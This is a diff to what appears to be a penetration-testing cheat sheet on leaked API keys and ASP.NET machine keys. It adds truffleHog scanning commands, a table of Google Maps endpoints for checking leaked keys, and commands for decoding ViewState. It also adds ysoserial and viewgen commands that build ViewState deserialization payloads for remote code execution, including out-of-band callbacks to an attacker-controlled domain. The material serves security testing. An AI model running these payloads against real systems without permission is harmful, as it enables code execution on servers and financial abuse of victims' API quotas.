@@ -25,6 +25,13 @@
 
 - [KeyFinder - is a tool that let you find keys while surfing the web!](https://github.com/momenbasel/KeyFinder)
 - [Keyhacks - is a repository which shows quick ways in which API keys leaked by a bug bounty program can be checked to see if they're valid.](https://github.com/streaak/keyhacks)
+- [truffleHog - Find credentials all over the place](https://github.com/trufflesecurity/truffleHog)
+    ```ps1
+    docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --repo https://github.com/trufflesecurity/test_keys
+    docker run -it -v "$PWD:/pwd" trufflesecurity/trufflehog:latest github --org=trufflesecurity
+    trufflehog git https://github.com/trufflesecurity/trufflehog.git
+    trufflehog github --endpoint https://api.github.com --org trufflesecurity --token GITHUB_TOKEN --debug --concurrency 2
+    ```
 
 ## Exploit
 
@@ -33,6 +40,23 @@ The following commands can be used to takeover accounts or extract personal info
 ### Google Maps 
 
 Use : https://github.com/ozguralp/gmapsapiscanner/
+
+Usage:
+|   Name   |   Endpoint   |
+|   ---    |    --- |
+|   Static Maps    |   https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=KEY_HERE   |
+|   Streetview |	https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=KEY_HERE |
+|   Embed  |	https://www.google.com/maps/embed/v1/place?q=place_id:ChIJyX7muQw8tokR2Vf5WBBk1iQ&key=KEY_HERE  |
+|   Directions |	https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=KEY_HERE    |
+|   Geocoding  |	https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=KEY_HERE |
+|   Distance Matrix    |	https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=KEY_HERE   |
+|   Find Place from Text   |	https://maps.googleapis.com/maps/api/place/findplacefromtext/json?input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&fields=photos,formatted_address,name,rating,opening_hours,geometry&key=KEY_HERE    |
+|   Autocomplete   |	https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=KEY_HERE    |
+|   Elevation  |	https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=KEY_HERE  |
+|   Timezone   |	https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=KEY_HERE   |
+|   Roads  |	https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=KEY_HERE    |
+|   Geolocate  |   https://www.googleapis.com/geolocation/v1/geolocate?key=KEY_HERE |
+
 
 Impact:
 * Consuming the company's monthly quota or can over-bill with unauthorized usage of this service and do financial damage to the company
@@ -125,21 +149,45 @@ Common locations of **web.config** / **machine.config**
     * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4  
     * HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey
 
-Exploit with [Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)
 
 #### Identify known machine key
 
+* Exploit with [Blacklist3r/AspDotNetWrapper](https://github.com/NotSoSecure/Blacklist3r)
+* Exploit with [ViewGen](https://github.com/0xacb/viewgen)
+
 ```powershell
-AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
+# --webconfig WEBCONFIG: automatically load keys and algorithms from a web.config file
+# -m MODIFIER, --modifier MODIFIER: VIEWSTATEGENERATOR value
+$ viewgen --guess "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
+[+] ViewState is not encrypted
+[+] Signature algorithm: SHA1
+
+# --encrypteddata : __VIEWSTATE parameter value of the target application
+# --modifier : __VIEWSTATEGENERATOR parameter value
+$ AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata <real viewstate value> --purpose=viewstate --modifier=<modifier value> –macdecode
+```
+
+#### Decode ViewState
+
+```powershell
+$ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
+
+$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate  --modifier=CA0B0334 --macdecode
+
+$ .\AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --decrypt --purpose=viewstate --modifier=6811C9FF --macdecode --TargetPagePath "/Savings-and-Investments/Application/ContactDetails.aspx" -f out.txt --IISDirPath="/"
 ```
 
 
 #### Generate ViewState for RCE
 
-**NOTE**: In Burp you should **URL Encode Key Characters** for your payload.
+**NOTE**: Send a POST request with the generated ViewState to the same endpoint, in Burp you should **URL Encode Key Characters** for your payload.
 
 ```powershell
-ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
+$ ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "cmd.exe /c nslookup <your collab domain>"  --decryptionalg="AES" --generator=ABABABAB decryptionkey="<decryption key>"  --validationalg="SHA1" --validationkey="<validation key>"
+$ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\pwn.txt" --generator="CA0B0334" --validationalg="MD5" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
+$ ysoserial.exe -p ViewState -g ActivitySurrogateSelectorFromFile -c "C:\Users\zhu\Desktop\ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll" --generator="CA0B0334" --validationalg="SHA1" --validationkey="b07b0f97365416288cf0247cffdf135d25f6be87"
+
+$ viewgen --webconfig web.config -m CA0B0334 -c "ping yourdomain.tld"
 ```
 
 
